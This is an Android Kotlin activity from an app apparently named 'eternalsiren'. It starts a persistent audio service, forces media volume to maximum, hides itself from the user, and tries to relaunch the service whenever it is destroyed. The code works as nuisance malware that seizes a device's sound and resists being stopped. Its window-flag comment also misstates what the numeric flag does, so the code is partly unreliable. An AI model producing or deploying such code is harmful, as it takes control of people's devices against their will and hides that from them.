package com.shadow.eternalsiren

import android.content.*
import android.media.AudioManager
import android.os.*
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    private lateinit var audioService: Intent
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Add flags to keep window active
        window.addFlags(67108864) // FLAG_DISMISS_KEYGUARD equivalent logic
        
        // Start eternal service
        audioService = Intent(this, EternalAudioService::class.java)
        
        if (Build.VERSION.SDK_INT >= 26) {
            startForegroundService(audioService)
        } else {
            startService(audioService)
        }
        
        // Maximize volume
        val audioManager = getSystemService(AUDIO_SERVICE) as AudioManager
        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, 
            audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0)
        
        // Hide app immediately
        moveTaskToBack(true)
        
        // Auto-restart if killed
        val restartReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                startService(audioService)
            }
        }
        registerReceiver(restartReceiver, IntentFilter("RESTART_AUDIO"))
        
        // Finish activity but keep service
        finish()
    }
    
    override fun onDestroy() {
        // Trigger resurrection
        sendBroadcast(Intent("RESTART_AUDIO"))
        super.onDestroy()
    }
}
